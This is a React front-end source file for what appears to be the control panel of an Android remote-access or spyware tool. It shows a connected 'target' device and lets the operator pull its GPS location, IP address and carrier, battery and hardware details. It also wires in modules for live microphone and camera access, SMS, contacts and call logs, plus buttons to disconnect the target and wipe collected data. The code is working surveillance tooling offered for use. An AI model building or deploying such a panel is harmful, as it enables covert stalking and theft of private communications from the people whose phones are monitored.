import React, { useState, useEffect, useCallback } from "react";
import { getStatus, getLogs, killServer, disconnectClient, fetchTelemetry, clearAllData } from "./api/client";
import { useTranslation } from "./context/LanguageContext";
import ThemeSelector from "./components/ThemeSelector";
import MicControl from "./components/MicControl";
import SmsManager from "./components/SmsManager";
import ContactsManager from "./components/ContactsManager";
import CallLogsManager from "./components/CallLogsManager";
import LogsView from "./components/LogsView";
import CameraManager from "./components/CameraManager";
import { Badge } from "./components/ui/badge";
import { Button } from "./components/ui/button";
import { Card, CardHeader, CardTitle, CardContent } from "./components/ui/card";
import {
  ShieldAlert,
  Smartphone,
  Radio,
  RefreshCw,
  Layers,
  Activity,
  RadioTower,
  MapPin,
  Battery,
  BatteryCharging,
  BatteryFull,
  BatteryMedium,
  BatteryLow,
  Power,
  Unlink,
  MessageSquare,
  Users,
  Terminal,
  Mic,
  Navigation,
  Target,
  ExternalLink,
  Copy,
  Check,
  Wifi,
  HardDrive,
  Cpu,
  Zap,
  Thermometer,
  Paintbrush,
} from "lucide-react";

export default function App() {
  const { language, setLanguage, t, isRtl } = useTranslation();
  const [status, setStatus] = useState(null);
  const [logs, setLogs] = useState([]);
  const [autoRefresh, setAutoRefresh] = useState(true);
  const [serverOnline, setServerOnline] = useState(true);
  const [disconnecting, setDisconnecting] = useState(false);
  const [killing, setKilling] = useState(false);
  const [queryingTelemetry, setQueryingTelemetry] = useState(false);
  const [copiedCoords, setCopiedCoords] = useState(false);
  const [copiedIp, setCopiedIp] = useState(false);
  const [clearingData, setClearingData] = useState(false);

  const refreshData = useCallback(async () => {
    try {
      const [statusRes, logsRes] = await Promise.allSettled([
        getStatus(),
        getLogs(),
      ]);
      if (statusRes.status === "fulfilled") {
        setStatus(statusRes.value.data);
        setServerOnline(true);
      } else {
        setServerOnline(false);
      }
      if (logsRes.status === "fulfilled") {
        setLogs(logsRes.value.data);
      }
    } catch (e) {
      setServerOnline(false);
    }
  }, []);

  useEffect(() => {
    refreshData();
  }, [refreshData]);

  useEffect(() => {
    if (!autoRefresh) return;
    const interval = setInterval(refreshData, 2000);
    return () => clearInterval(interval);
  }, [autoRefresh, refreshData]);

  const handleDisconnect = async () => {
    setDisconnecting(true);
    try {
      await disconnectClient();
      await refreshData();
    } finally {
      setDisconnecting(false);
    }
  };

  const handleKillServer = async () => {
    if (window.confirm(t("app.confirm_kill"))) {
      setKilling(true);
      try {
        await killServer();
      } finally {
        setKilling(false);
      }
    }
  };

  const handleClearAllData = async () => {
    if (window.confirm(t("clear_data.confirm"))) {
      setClearingData(true);
      try {
        await clearAllData();
        await refreshData();
      } finally {
        setClearingData(false);
      }
    }
  };

  const handleQueryTelemetry = async () => {
    setQueryingTelemetry(true);
    try {
      await fetchTelemetry();
      await refreshData();
    } finally {
      setQueryingTelemetry(false);
    }
  };

  const isConnected = !!status?.client_connected;
  const telemetry = status?.telemetry;
  const device = telemetry?.device;
  const battery = telemetry?.battery;
  const loc = telemetry?.location;
  const network = telemetry?.network;
  const storage = telemetry?.storage;
  const memory = telemetry?.memory;

  const handleCopyCoords = () => {
    if (loc?.latitude != null && loc?.longitude != null) {
      navigator.clipboard.writeText(`${loc.latitude},${loc.longitude}`);
      setCopiedCoords(true);
      setTimeout(() => setCopiedCoords(false), 1500);
    }
  };

  const handleCopyIp = () => {
    if (network?.ip) {
      navigator.clipboard.writeText(network.ip);
      setCopiedIp(true);
      setTimeout(() => setCopiedIp(false), 1500);
    }
  };

  const formatBytes = (bytes) => {
    if (!bytes || bytes <= 0) return "0 B";
    const gb = bytes / (1024 * 1024 * 1024);
    if (gb >= 1) return `${gb.toFixed(1)} GB`;
    const mb = bytes / (1024 * 1024);
    return `${mb.toFixed(0)} MB`;
  };

  const calcPercentage = (used, total) => {
    if (!total || total <= 0) return 0;
    return Math.min(100, Math.round((used / total) * 100));
  };

  const getBatteryIcon = () => {
    if (!battery) return <Battery className="w-4 h-4 text-dim" />;
    if (battery.charging) return <BatteryCharging className="w-4 h-4 text-emerald-400" />;
    if (battery.level >= 75) return <BatteryFull className="w-4 h-4 text-emerald-400" />;
    if (battery.level >= 25) return <BatteryMedium className="w-4 h-4 text-amber-400" />;
    return <BatteryLow className="w-4 h-4 text-rose-400" />;
  };

  return (
    <div className={`min-h-screen bg-background text-main antialiased selection:bg-accent selection:text-white pb-8 ${isRtl ? "font-sans" : ""}`}>
      <header className="border-b border-border bg-header/95 backdrop-blur-md sticky top-0 z-40">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-14 flex items-center justify-between">
          <div className="flex items-center space-x-3 rtl:space-x-reverse">
            <div className="w-8 h-8 rounded-lg bg-gradient-to-b from-zinc-800 to-zinc-950 border border-zinc-700/80 flex items-center justify-center shadow-md shadow-black/40 ring-1 ring-emerald-500/20">
              <RadioTower className="w-[18px] h-[18px] text-emerald-400 drop-shadow-[0_0_6px_rgba(52,211,153,0.6)]" />
            </div>
            <div className="flex items-center space-x-2 rtl:space-x-reverse">
              <span className="runic-text text-base tracking-widest text-main font-bold">{t("app.title")}</span>
              <span className="text-[10px] font-mono uppercase px-1.5 py-0.5 rounded bg-surface-elevated text-zinc-400 border border-border tracking-wider">
                {t("app.subtitle")}
              </span>
            </div>
          </div>

          <div className="flex items-center space-x-2.5 rtl:space-x-reverse">
            <ThemeSelector />

            <div className="flex items-center bg-surface p-0.5 rounded-md border border-border text-xs font-mono">
              <button
                type="button"
                onClick={() => setLanguage("en")}
                className={`px-2 py-0.5 rounded text-[11px] font-semibold transition-colors ${
                  language === "en" ? "bg-accent text-white shadow-sm" : "text-dim hover:text-main"
                }`}
              >
                EN
              </button>
              <button
                type="button"
                onClick={() => setLanguage("fa")}
                className={`px-2 py-0.5 rounded text-[11px] font-semibold transition-colors ${
                  language === "fa" ? "bg-accent text-white shadow-sm" : "text-dim hover:text-main"
                }`}
              >
                FA
              </button>
            </div>

            <div className="hidden sm:flex items-center space-x-2 rtl:space-x-reverse bg-surface px-3 py-1 rounded-md border border-border text-xs font-mono">
              <span className="w-2 h-2 rounded-full bg-blue-500" />
              <span className="text-dim">{t("app.gateway")}:</span>
              <span className="text-main">:{status?.tcp_port || 33110}</span>

              <span className="text-border">|</span>

              <span className={`w-2 h-2 rounded-full ${isConnected ? "bg-emerald-500" : "bg-slate-600"}`} />
              <span className="text-dim">{t("app.target")}:</span>
              <span className={isConnected ? "text-emerald-400 font-semibold" : "text-dim"}>
                {isConnected ? (status.client_addr || t("app.online")) : t("app.standby")}
              </span>
            </div>

            {isConnected && (
              <Button
                size="sm"
                variant="destructive"
                disabled={disconnecting}
                onClick={handleDisconnect}
                className="h-7 px-2 text-xs font-mono"
              >
                <Unlink className="w-3 h-3 mr-1 rtl:mr-0 rtl:ml-1" />
                {t("app.disconnect")}
              </Button>
            )}

            <Button
              size="sm"
              variant="outline"
              disabled={clearingData}
              onClick={handleClearAllData}
              className="h-7 w-7 p-0 text-dim hover:text-amber-400 hover:border-amber-500/50"
              title={t("clear_data.button")}
            >
              <Paintbrush className={`w-3 h-3 ${clearingData ? "animate-spin" : ""}`} />
            </Button>

            <Button
              size="sm"
              variant="outline"
              onClick={refreshData}
              className="h-7 w-7 p-0"
              title={t("app.refresh")}
            >
              <RefreshCw className="w-3 h-3 text-dim" />
            </Button>

            <Button
              size="sm"
              variant="ghost"
              disabled={killing}
              onClick={handleKillServer}
              className="h-7 w-7 p-0 text-dim hover:text-rose-400"
              title={t("app.kill")}
            >
              <Power className="w-3 h-3" />
            </Button>
          </div>
        </div>
      </header>

      {!serverOnline && (
        <div className="bg-rose-950/40 border-b border-rose-800/40 px-4 py-1.5 text-xs text-rose-400 flex items-center justify-center space-x-2 font-mono">
          <ShieldAlert className="w-3.5 h-3.5 flex-shrink-0" />
          <span>{t("app.backend_unreachable")}</span>
        </div>
      )}

      <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-5 space-y-5">
        <div className="flex items-center justify-between pb-1 border-b border-border-muted">
          <div className="flex items-center space-x-2">
            <span className="text-xs uppercase font-mono tracking-widest text-dim">
              {t("telemetry.matrix_title")}
            </span>
          </div>

          <Button
            size="sm"
            variant="outline"
            disabled={queryingTelemetry || !isConnected}
            onClick={handleQueryTelemetry}
            className="h-7 text-xs font-mono"
          >
            <RefreshCw className={`w-3 h-3 mr-1.5 rtl:mr-0 rtl:ml-1.5 ${queryingTelemetry ? "animate-spin" : ""}`} />
            {queryingTelemetry ? t("telemetry.polling") : t("telemetry.acquire_fix")}
          </Button>
        </div>

        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3.5">
          <Card className="border-border bg-surface shadow-sm">
            <CardHeader className="p-3 pb-2 flex flex-row items-center justify-between border-b border-border-muted">
              <div className="flex items-center space-x-1.5 rtl:space-x-reverse">
                <MapPin className="w-3.5 h-3.5 text-rose-400" />
                <span className="text-xs font-mono font-semibold tracking-wide text-main">
                  {t("telemetry.gps_title")}
                </span>
              </div>
              <Badge variant={loc?.status === "available" || loc?.latitude ? "success" : "secondary"} className="text-[9px] px-1.5 py-0 font-mono">
                {loc?.status ? loc.status.toUpperCase() : loc?.latitude ? t("telemetry.gps_locked") : t("telemetry.gps_no_fix")}
              </Badge>
            </CardHeader>
            <CardContent className="p-3 space-y-2">
              {loc?.latitude != null && loc?.longitude != null ? (
                <>
                  <div className="bg-input p-2 rounded border border-border font-mono text-xs space-y-0.5">
                    <div className="flex justify-between">
                      <span className="text-dim text-[10px]">{t("telemetry.lat")}</span>
                      <span className="text-main font-semibold">{loc.latitude.toFixed(5)}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-dim text-[10px]">{t("telemetry.lon")}</span>
                      <span className="text-main font-semibold">{loc.longitude.toFixed(5)}</span>
                    </div>
                  </div>
                  <div className="flex items-center justify-between text-[10px] text-dim font-mono">
                    <span>{t("telemetry.acc")}: ±{loc.accuracy || "?"}m</span>
                    <span>{t("telemetry.alt")}: {loc.altitude ? `${Math.round(loc.altitude)}m` : "?"}</span>
                  </div>

                  <div className="pt-1 space-y-1.5">
                    <a
                      href={`https://www.google.com/maps?q=${loc.latitude},${loc.longitude}`}
                      target="_blank"
                      rel="noreferrer"
                      className="block w-full"
                    >
                      <Button size="sm" variant="default" className="w-full h-7 text-xs font-medium bg-blue-600 hover:bg-blue-500 text-white flex items-center justify-center">
                        <MapPin className="w-3 h-3 mr-1 rtl:mr-0 rtl:ml-1 text-rose-300" />
                        {t("telemetry.maps")}
                        <ExternalLink className="w-3 h-3 ml-1.5 rtl:ml-0 rtl:mr-1.5 text-blue-200" />
                      </Button>
                    </a>

                    <Button
                      size="sm"
                      variant="outline"
                      onClick={handleCopyCoords}
                      className="w-full h-6 text-[11px] font-mono text-dim hover:text-main flex items-center justify-center"
                    >
                      {copiedCoords ? (
                        <>
                          <Check className="w-3 h-3 mr-1 rtl:mr-0 rtl:ml-1 text-emerald-400" />
                          {t("telemetry.copied_coords")}
                        </>
                      ) : (
                        <>
                          <Copy className="w-3 h-3 mr-1 rtl:mr-0 rtl:ml-1 text-dim" />
                          {t("telemetry.copy_coords")} ({loc.latitude.toFixed(4)}, {loc.longitude.toFixed(4)})
                        </>
                      )}
                    </Button>
                  </div>
                </>
              ) : (
                <div className="py-3 text-center space-y-1.5">
                  <p className="text-[11px] text-dim font-mono">
                    {t("telemetry.no_gps_fix")}
                  </p>
                  <Button
                    size="sm"
                    variant="outline"
                    disabled={queryingTelemetry || !isConnected}
                    onClick={handleQueryTelemetry}
                    className="h-6 text-[10px] font-mono"
                  >
                    <RefreshCw className={`w-2.5 h-2.5 mr-1 rtl:mr-0 rtl:ml-1 ${queryingTelemetry ? "animate-spin" : ""}`} />
                    {t("telemetry.acquire_fix_btn")}
                  </Button>
                </div>
              )}
            </CardContent>
          </Card>

          <Card className="border-border bg-surface shadow-sm">
            <CardHeader className="p-3 pb-2 flex flex-row items-center justify-between border-b border-border-muted">
              <div className="flex items-center space-x-1.5 rtl:space-x-reverse">
                {getBatteryIcon()}
                <span className="text-xs font-mono font-semibold tracking-wide text-main">
                  {t("telemetry.power_title")}
                </span>
              </div>
              {battery && (
                <Badge variant={battery.level > 25 ? "success" : "destructive"} className="text-[9px] px-1.5 py-0 font-mono">
                  {battery.charging ? t("telemetry.charging") : t("telemetry.discharging")}
                </Badge>
              )}
            </CardHeader>
            <CardContent className="p-3 space-y-2">
              {battery ? (
                <>
                  <div className="flex items-baseline justify-between">
                    <div className="flex items-baseline space-x-1 rtl:space-x-reverse">
                      <span className="text-2xl font-bold font-mono text-main">{battery.level}%</span>
                      <span className="text-[10px] text-dim font-mono">{t("telemetry.capacity")}</span>
                    </div>
                    <span className="text-[10px] font-mono px-1.5 py-0.5 rounded bg-surface-elevated border border-border text-main">
                      {battery.plugged}
                    </span>
                  </div>

                  <div className="w-full bg-input rounded-full h-1.5 overflow-hidden border border-border-muted">
                    <div
                      className={`h-full rounded-full transition-all duration-300 ${
                        battery.level > 40 ? "bg-emerald-500" : battery.level > 15 ? "bg-amber-500" : "bg-rose-500"
                      }`}
                      style={{ width: `${Math.max(0, Math.min(100, battery.level))}%` }}
                    />
                  </div>

                  <div className="grid grid-cols-3 gap-1 pt-0.5 text-[10px] font-mono text-center">
                    <div className="bg-input p-1.5 rounded border border-border-muted">
                      <span className="text-dim block text-[8px]">{t("telemetry.temp")}</span>
                      <span className="text-main font-semibold">{battery.temperature}°C</span>
                    </div>
                    <div className="bg-input p-1.5 rounded border border-border-muted">
                      <span className="text-dim block text-[8px]">{t("telemetry.volt")}</span>
                      <span className="text-main font-semibold">{battery.voltage}V</span>
                    </div>
                    <div className="bg-input p-1.5 rounded border border-border-muted">
                      <span className="text-dim block text-[8px]">{t("telemetry.health")}</span>
                      <span className="text-main font-semibold">{battery.health}</span>
                    </div>
                  </div>
                </>
              ) : (
                <div className="py-4 text-center text-xs text-dim font-mono">
                  {t("telemetry.no_battery")}
                </div>
              )}
            </CardContent>
          </Card>

          <Card className="border-border bg-surface shadow-sm">
            <CardHeader className="p-3 pb-2 flex flex-row items-center justify-between border-b border-border-muted">
              <div className="flex items-center space-x-1.5 rtl:space-x-reverse">
                <Wifi className="w-3.5 h-3.5 text-sky-400" />
                <span className="text-xs font-mono font-semibold tracking-wide text-main">
                  {t("telemetry.network_title")}
                </span>
              </div>
              {network?.type && (
                <Badge variant="secondary" className="text-[9px] px-1.5 py-0 font-mono">
                  {network.type.toUpperCase()}
                </Badge>
              )}
            </CardHeader>
            <CardContent className="p-3 space-y-2 text-xs font-mono">
              {network ? (
                <>
                  <div className="bg-input p-2 rounded border border-border space-y-1">
                    <div className="flex justify-between items-center text-[10px]">
                      <span className="text-dim">{t("telemetry.ssid_apn")}</span>
                      <span className="text-main font-semibold truncate max-w-[130px]">{network.ssid || network.carrier || "—"}</span>
                    </div>
                    <div className="flex justify-between items-center text-[10px]">
                      <span className="text-dim">{t("telemetry.carrier")}</span>
                      <span className="text-main">{network.carrier || "—"}</span>
                    </div>
                  </div>

                  <div className="bg-input p-2 rounded border border-border flex items-center justify-between text-[11px]">
                    <div>
                      <span className="text-dim text-[9px] block">{t("telemetry.ipv4")}</span>
                      <span className="text-main font-semibold">{network.ip || "—"}</span>
                    </div>
                    {network.ip && (
                      <Button
                        size="sm"
                        variant="ghost"
                        onClick={handleCopyIp}
                        className="h-6 w-6 p-0 text-dim hover:text-main"
                        title="Copy IP"
                      >
                        {copiedIp ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                      </Button>
                    )}
                  </div>
                </>
              ) : (
                <div className="py-4 text-center text-xs text-dim font-mono">
                  {t("telemetry.no_network")}
                </div>
              )}
            </CardContent>
          </Card>

          <Card className="border-border bg-surface shadow-sm">
            <CardHeader className="p-3 pb-2 flex flex-row items-center justify-between border-b border-border-muted">
              <div className="flex items-center space-x-1.5 rtl:space-x-reverse">
                <Cpu className="w-3.5 h-3.5 text-purple-400" />
                <span className="text-xs font-mono font-semibold tracking-wide text-main">
                  {t("telemetry.platform_title")}
                </span>
              </div>
              {device?.android_version && (
                <Badge variant="secondary" className="text-[9px] px-1.5 py-0 font-mono">
                  AND {device.android_version}
                </Badge>
              )}
            </CardHeader>
            <CardContent className="p-3 space-y-2 text-xs">
              <div className="bg-input p-1.5 rounded border border-border flex justify-between items-center text-[10px] font-mono">
                <span className="text-dim">{t("telemetry.model")}</span>
                <span className="text-main font-semibold truncate max-w-[130px]">{device ? `${device.manufacturer} ${device.model}` : t("telemetry.awaiting_connect")}</span>
              </div>

              {storage && (
                <div className="space-y-0.5">
                  <div className="flex justify-between text-[10px] font-mono text-dim">
                    <span>{t("telemetry.storage")}</span>
                    <span className="text-main">{formatBytes(storage.used_bytes)} / {formatBytes(storage.total_bytes)}</span>
                  </div>
                  <div className="w-full bg-input rounded-full h-1 overflow-hidden border border-border-muted">
                    <div className="bg-purple-500 h-full rounded-full" style={{ width: `${calcPercentage(storage.used_bytes, storage.total_bytes)}%` }} />
                  </div>
                </div>
              )}

              {memory && (
                <div className="space-y-0.5">
                  <div className="flex justify-between text-[10px] font-mono text-dim">
                    <span>{t("telemetry.ram")}</span>
                    <span className="text-main">{formatBytes(memory.used_bytes)} / {formatBytes(memory.total_bytes)}</span>
                  </div>
                  <div className="w-full bg-input rounded-full h-1 overflow-hidden border border-border-muted">
                    <div className="bg-blue-500 h-full rounded-full" style={{ width: `${calcPercentage(memory.used_bytes, memory.total_bytes)}%` }} />
                  </div>
                </div>
              )}
            </CardContent>
          </Card>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-4 gap-4 items-start">
          <div className="h-full space-y-4">
            <MicControl status={status} onRefresh={refreshData} />
            {status?.camera_enabled && (
              <CameraManager status={status} onRefresh={refreshData} />
            )}
          </div>

          <div className="h-full">
            <CallLogsManager status={status} onRefresh={refreshData} />
          </div>

          <div className="h-full">
            <SmsManager status={status} onRefresh={refreshData} />
          </div>

          <div className="h-full">
            <ContactsManager status={status} onRefresh={refreshData} />
          </div>
        </div>

        <div className="w-full">
          <LogsView
            logs={logs}
            autoRefresh={autoRefresh}
            setAutoRefresh={setAutoRefresh}
            onRefresh={refreshData}
          />
        </div>
      </main>
    </div>
  );
}
